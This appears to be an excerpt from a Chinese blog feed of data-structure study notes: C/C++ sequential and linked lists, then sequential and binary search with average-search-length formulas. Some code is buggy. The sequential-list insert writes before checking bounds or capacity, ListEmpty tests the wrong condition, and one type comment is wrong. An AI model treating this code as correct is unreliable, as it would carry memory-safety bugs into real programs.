class="type">void</span> <span class="title function_">ListInsert_Sq</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,Elemtype e)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j=L.length<span class="number">-1</span>;j&gt;=i<span class="number">-1</span>;--j)</span><br><span class="line">    &#123;</span><br><span class="line">        L.elem[j+<span class="number">1</span>]=L.elem[j];</span><br><span class="line">    &#125;</span><br><span class="line">    L.elem[i<span class="number">-1</span>]=e;</span><br><span class="line">    ++L.length;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Insert operation succeed.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L.length+<span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (L.length&gt;=L.listsize)&#123;</span><br><span class="line">        Elemtype *newbase;</span><br><span class="line">        newbase=(Elemtype*)<span class="built_in">realloc</span>(L.elem,(L.listsize+LISTINCREMENT)*<span class="keyword">sizeof</span>(Elemtype));</span><br><span class="line">        <span class="keyword">if</span>(!newbase) <span class="built_in">printf</span>(<span class="string">&quot;failed!&quot;</span>);</span><br><span class="line">        L.elem=newbase;</span><br><span class="line">        L.listsize+=LISTINCREMENT;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ListDelete_Sq</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,Elemtype &amp;e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((i&lt;<span class="number">1</span>)||(i&gt;L.length))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    e=L.elem[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=i<span class="number">-1</span>;j&lt;L.length<span class="number">-1</span>;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        L.elem[j]=L.elem[j+<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    L.length--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;delete succeed.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0---exit\n1--InitList_Sq\n2--DestoryList\n3--ShowList_Sq\n4--ListEmpty\n5--ListLength\n6--PriorElem\n7--ListInsert_Sq\n8--ListDelete_Sq\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;================================\n&quot;</span>);</span><br><span class="line">        <span class="type">int</span> temp;SqList L;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input button:&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;process exit.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">1</span>) InitList_Sq(L);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">2</span>) DestoryList(L);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">3</span>) ShowList_Sq(L);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">4</span>) ListEmpty(L);</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">5</span>) <span class="built_in">printf</span>(<span class="string">&quot;List length:%d\n&quot;</span>,ListLength(L));</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">6</span>)&#123;</span><br><span class="line">            Elemtype pre_e;</span><br><span class="line">            <span class="type">int</span> cur_e;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;input cur_e:&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;cur_e);</span><br><span class="line">            PriorElem(L, cur_e, pre_e);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;PriorElem is:%d&quot;</span>,pre_e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">7</span>)&#123;</span><br><span class="line">            Elemtype e;</span><br><span class="line">            <span class="type">int</span> i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;insert before i:&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;input data(int):&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;e);</span><br><span class="line">            ListInsert_Sq(L, i, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="number">8</span>)&#123;</span><br><span class="line">            Elemtype e;</span><br><span class="line">            <span class="type">int</span> i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;input number to delete:&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">            ListDelete_Sq(L, i, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="顺序表的优缺点"><a href="#顺序表的优缺点" class="headerlink" title="顺序表的优缺点"></a>顺序表的优缺点</h4><p>优点：节省存储空间；对线性表中的第i个结点的操作易于实现；容易查找一个结点的前驱和后继</p><p>缺点：插入和删除需要移动数据；建立空表时较难确定所需的存储空间</p><h3 id="线性表的链式表示和实现"><a href="#线性表的链式表示和实现" class="headerlink" title="线性表的链式表示和实现"></a>线性表的链式表示和实现</h3><h4 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br></pre></td></tr></table></figure><h4 id="基本操作实现-1"><a href="#基本操作实现-1" class="headerlink" title="基本操作实现"></a>基本操作实现</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUE 1;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FALSE 0;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OK 1;</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    L=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">ListEmpty</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;<span class="keyword">return</span> TRUE;&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="keyword">return</span> FALSE;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">GetElem_L</span><span class="params">(LinkList L,<span class="type">int</span> i,ElemType &amp;e)</span>&#123;</span><br><span class="line">    LNode* p;</span><br><span class="line">    p=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    p=L-&gt;next;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(p&amp;&amp;j&lt;i)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p||j&gt;i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;ERROR!&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    e = p-&gt;data;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ListInsert_L</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType e)</span>&#123;</span><br><span class="line">    LNode* p=L;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p&amp;&amp;j&lt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p||j&gt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;ERROR!&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    LNode *s;</span><br><span class="line">    s=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    s-&gt;data=e;</span><br><span class="line">    s-&gt;next=p-&gt;next;</span><br><span class="line">    p-&gt;next=s;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Insert succeed.&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ListDelete_L</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType &amp;e)</span>&#123;</span><br><span class="line">    LNode *p=L;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next&amp;&amp;j&lt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(p-&gt;next)||j&gt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;ERROR!&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    LNode *q=p-&gt;next;</span><br><span class="line">    p-&gt;next=q-&gt;next;</span><br><span class="line">    e=q-&gt;data;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Delete succeed.&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ClearList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(L-&gt;next)&#123;</span><br><span class="line">        LNode *p;</span><br><span class="line">        p=L-&gt;next;</span><br><span class="line">        L-&gt;next=p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkList L;</span><br><span class="line">    InitList(L);</span><br><span class="line">    ElemType e;</span><br><span class="line">    e=<span class="number">1</span>;</span><br><span class="line">    ListInsert_L(L, <span class="number">1</span>, e);</span><br><span class="line">    L-&gt;next-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;L-&gt;next-&gt;next&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h4><p>单链表的最后一个结点的指针指向头指针</p><p>优点是从表中任意结点出发都可以找到其他结点</p><p>循环链表采用头尾指针，因为这样查找第一个结点和最后一个结点都容易</p><h4 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h4><p>存储实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span>&#123;</span></span><br><span class="line">  ElemType data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span>* <span class="title">prior</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;DuLNode,*DuLinkList;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】 查找</title>
      <link href="/2023/11/21/"/>
      <url>/2023/11/21/</url>
      
        <content type="html"><![CDATA[<p>本节的哈希散列技术还有待进一步掌握</p><h3 id="查找的前置知识"><a href="#查找的前置知识" class="headerlink" title="查找的前置知识"></a>查找的前置知识</h3><h4 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h4><p>1.查找表：同一类型的数据元素或记录构成的集合</p><p>2.静态查找表：仅作查询和检索操作的查找表</p><p>3.动态查找表：在查找时包含插入、删除或修改</p><p>4.主关键字：可以识别的一个记录的数据项(字段)</p><p>5.次关键字：关联若干记录的数据项（字段）</p><p>6.根据给定的某个值，在查找表中确定一个群关键字等于给定值的数据元素(记录)</p><p>7.查找成功：查找表中存在满足条件的记录</p><p>8.查找不成功：查找表中不存在满足条件的记录</p><h4 id="类型定义"><a href="#类型定义" class="headerlink" title="类型定义"></a>类型定义</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">float</span> Keytype; <span class="comment">//Keytype为浮点数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> Keytype;<span class="comment">//Keytype为整型数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">float</span> Keytype;<span class="comment">//Keytype为字符指针数据类型</span></span><br></pre></td></tr></table></figure><p>数据元素定义：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">Keytype key;<span class="comment">//关键字</span></span><br><span class="line">... <span class="comment">//可以是其他关键字</span></span><br><span class="line">&#125;ElemType;<span class="comment">//ElemType结构体数据类型</span></span><br></pre></td></tr></table></figure><h4 id="查找的分类"><a href="#查找的分类" class="headerlink" title="查找的分类"></a>查找的分类</h4><p>1.基于关键词比较的查找：顺序查找、折半查砸后、分块查找、BST&amp;AVL、B-树和B+树</p><p>2.基于关键字存储位置的查找：散列法</p><p>根据被查找的数据集合存储位置又分为：</p><p>1.内查找：整个查找过程都在内存进行</p><p>2.外查找：查找过程中需要访问外存</p><h3 id="静态查找表"><a href="#静态查找表" class="headerlink" title="静态查找表"></a>静态查找表</h3><h4 id="顺序表的查找"><a href="#顺序表的查找" class="headerlink" title="顺序表的查找"></a>顺序表的查找</h4><h5 id="静态查找表的抽象数据类型"><a href="#静态查找表的抽象数据类型" class="headerlink" title="静态查找表的抽象数据类型"></a>静态查找表的抽象数据类型</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ADT StaticSearchTable&#123;</span><br><span class="line">数据对象D：D是具有相同特性的数据元素的集合。每个数据元素含有类型相同的关键字，可唯一表示数据元素。</span><br><span class="line">数据关系R：数据元素同属一个集合</span><br><span class="line">基本操作P：</span><br><span class="line"><span class="built_in">Create</span>(&amp;ST,n);<span class="comment">//建立静态查找表</span></span><br><span class="line"><span class="built_in">Destroy</span>(&amp;ST);<span class="comment">//销毁静态查找表</span></span><br><span class="line"><span class="built_in">Search</span>(ST,key)<span class="comment">//按关键字key查找</span></span><br><span class="line"><span class="built_in">Traverse</span>(ST,<span class="built_in">visit</span>());<span class="comment">//遍历查找表</span></span><br><span class="line"><span class="comment">//插入、删除操作，在顺序表中不适合</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="顺序查找表的存储结构"><a href="#顺序查找表的存储结构" class="headerlink" title="顺序查找表的存储结构"></a>顺序查找表的存储结构</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">KeyType key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="comment">//数据元素存储空间基址，建表时，按实际长度分配，0号单元留空</span></span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">&#125;SSTable;</span><br></pre></td></tr></table></figure><h5 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="comment">//数据元素存储空间基址，建表时，按实际长度分配，0号单元留空</span></span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">&#125;SSTable;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Search_Seq</span><span class="params">(SSTable ST,KeyType key)</span></span>&#123;</span><br><span class="line">    ST.elem[<span class="number">0</span>].key=key;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=ST.length;ST.elem[i].key!=key;i--);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">    <span class="comment">//若返回非0，则找到</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    SSTable ST;</span><br><span class="line">    ST.length=<span class="number">10</span>;</span><br><span class="line">    ST.elem=(ElemType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ElemType)*(ST.length+<span class="number">1</span>));</span><br><span class="line">    ST.elem[<span class="number">0</span>].key=<span class="literal">NULL</span>;</span><br><span class="line">    ST.elem[<span class="number">1</span>].key=<span class="number">1</span>;</span><br><span class="line">    ST.elem[<span class="number">2</span>].key=<span class="number">5</span>;</span><br><span class="line">    ST.elem[<span class="number">3</span>].key=<span class="number">3</span>;</span><br><span class="line">    ST.elem[<span class="number">4</span>].key=<span class="number">9</span>;</span><br><span class="line">    ST.elem[<span class="number">5</span>].key=<span class="number">10</span>;</span><br><span class="line">    ST.elem[<span class="number">6</span>].key=<span class="number">14</span>;</span><br><span class="line">    ST.elem[<span class="number">7</span>].key=<span class="number">2</span>;</span><br><span class="line">    ST.elem[<span class="number">8</span>].key=<span class="number">12</span>;</span><br><span class="line">    ST.elem[<span class="number">9</span>].key=<span class="number">19</span>;</span><br><span class="line">    ST.elem[<span class="number">10</span>].key=<span class="number">17</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">Search_Seq</span>(ST, <span class="number">13</span>));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h5><p>进行比较的关键字个数的期望值： 即查找成功时的平均查找长度</p><script type="math/tex; mode=display">ASL=\sum_{i=1}^{n}P_iC_i</script><p>其中n为表长</p><p>$P_i$为查找表中第i个记录被查找的概率</p><p>$C_i$为找到记录i时关键字的比较次数</p><p>在等概率查找情况下，$P_i=\frac{1}{n}$</p><p>顺序表的平均(成功)查找长度为：$ASL_{ss}=\frac{1}{n}\sum_{i=1}^n(n-i+1)=\frac{n+1}{2}$</p><p>在不等概率查找的情况下，ASL在$P_n\geqslant P_{n-1}\geqslant …\geqslant P_2 \geqslant P_1$ 时取最小值</p><p>$ASL_{失败}=n+1$</p><h4 id="有序表的查找"><a href="#有序表的查找" class="headerlink" title="有序表的查找"></a>有序表的查找</h4><h5 id="折半查找"><a href="#折半查找" class="headerlink" title="折半查找"></a>折半查找</h5><p>前提要求：顺序存储且有序</p><h5 id="折半查找的思想"><a href="#折半查找的思想" class="headerlink" title="折半查找的思想"></a>折半查找的思想</h5><p>1.将要查找的关键字与查找表中间的元素的关键字进行比较，若相等，返回当前位置</p><p>2.若查找关键字比当前位置关键字小，向前秭归，否则向后递归</p><h5 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="comment">//数据元素存储空间基址，建表时，按实际长度分配，0号单元留空</span></span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">&#125;SSTable;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Search_Bin</span><span class="params">(SSTable ST,KeyType key)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> low=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> high=ST.length;</span><br><span class="line">    <span class="type">int</span> mid;</span><br><span class="line">    <span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">        mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(ST.elem[mid].key==key) <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ST.elem[mid].key&gt;key)&#123;</span><br><span class="line">            high=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> low=mid+<span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="comment">//折半查找，有序表；</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    SSTable ST;</span><br><span class="line">    ST.length=<span class="number">10</span>;</span><br><span class="line">    ST.elem=(ElemType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ElemType)*(ST.length+<span class="number">1</span>));</span><br><span class="line">    ST.elem[<span class="number">0</span>].key=<span class="literal">NULL</span>;</span><br><span class="line">    ST.elem[<span class="number">1</span>].key=<span class="number">1</span>;</span><br><span class="line">    ST.elem[<span class="number">2</span>].key=<span class="number">3</span>;</span><br><span class="line">    ST.elem[<span class="number">3</span>].key=<span class="number">5</span>;</span><br><span class="line">    ST.elem[<span class="number">4</span>].key=<span class="number">7</span>;</span><br><span class="line">    ST.elem[<span class="number">5</span>].key=<span class="number">9</span>;</span><br><span class="line">    ST.elem[<span class="number">6</span>].key=<span class="number">10</span>;</span><br><span class="line">    ST.elem[<span class="number">7</span>].key=<span class="number">12</span>;</span><br><span class="line">    ST.elem[<span class="number">8</span>].key=<span class="number">14</span>;</span><br><span class="line">    ST.elem[<span class="number">9</span>].key=<span class="number">20</span>;</span><br><span class="line">    ST.elem[<span class="number">10</span>].key=<span class="number">21</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">Search_Bin</span>(ST, <span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>折半查找只适用于静态查找</p><h5 id="算法分析-1"><a href="#算法分析-1" class="headerlink" title="算法分析"></a>算法分析</h5><p>时间复杂度为$O(\log_2n)$</p><p>对于n个元素，二分查找，成功最多关键字比较次数为$\lceil log_2(n+1)\rceil$（向上取整），不成功的关键字比较次数为：$\lceil log_2(n+1)\rceil$</p><h5 id="折半查找的递归实现"><a href="#折半查找的递归实现" class="headerlink" title="折半查找的递归实现"></a>折半查找的递归实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="comment">//数据元素存储空间基址，建表时，按实际长度分配，0号单元留空</span></span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">&#125;SSTable;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BinSearch2</span><span class="params">(SSTable ST,<span class="type">int</span> low,<span class="type">int</span> high,KeyType key)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> mid;</span><br><span class="line">    <span class="keyword">if</span>(low&gt;high) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(key&lt;ST.elem[mid].key)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">BinSearch2</span>(ST, low, mid<span class="number">-1</span>, key);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(key&gt;ST.elem[mid].key)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">BinSearch2</span>(ST, mid+<span class="number">1</span>, high, key);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    SSTable ST;</span><br><span class="line">    ST.length=<span class="number">10</span>;</span><br><span class="line">    ST.elem=(ElemType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ElemType)*(ST.length+<span class="number">1</span>));</span><br><span class="line">    ST.elem[<span class="number">0</span>].key=<span class="literal">NULL</span>;</span><br><span class="line">    ST.elem[<span class="number">1</span>].key=<span class="number">1</span>;</span><br><span class="line">    ST.elem[<span class="number">2</span>].key=<span class="number">3</span>;</span><br><span class="line">    ST.elem[<span class="number">3</span>].key=<span class="number">5</span>;</span><br><span class="line">    ST.elem[<span class="number">4</span>].key=<span class="number">7</span>;</span><br><span class="line">    ST.elem[<span class="number">5</span>].key=<span class="number">9</span>;</span><br><span class="line">    ST.elem[<span class="number">6</span>].key=<span class="number">10</span>;</span><br><span class="line">    ST.elem[<span class="number">7</span>].key=<span class="number">12</span>;</span><br><span class="line">    ST.elem[<span class="number">8</span>].key=<span class="number">14</span>;</span><br><span class="line">    ST.elem[<span class="number">9</span>].key=<span class="number">20</span>;</span><br><span class="line">    ST.elem[<span class="number">10</span>].key=<span class="number">21</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">BinSearch2</span>(ST, <span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="索引顺序表的查找"><a href="#索引顺序表的查找" class="headerlink" title="索引顺序表的查找"></a>索引顺序表的查找</h4><h5 id="索引顺序表的存储要求"><a 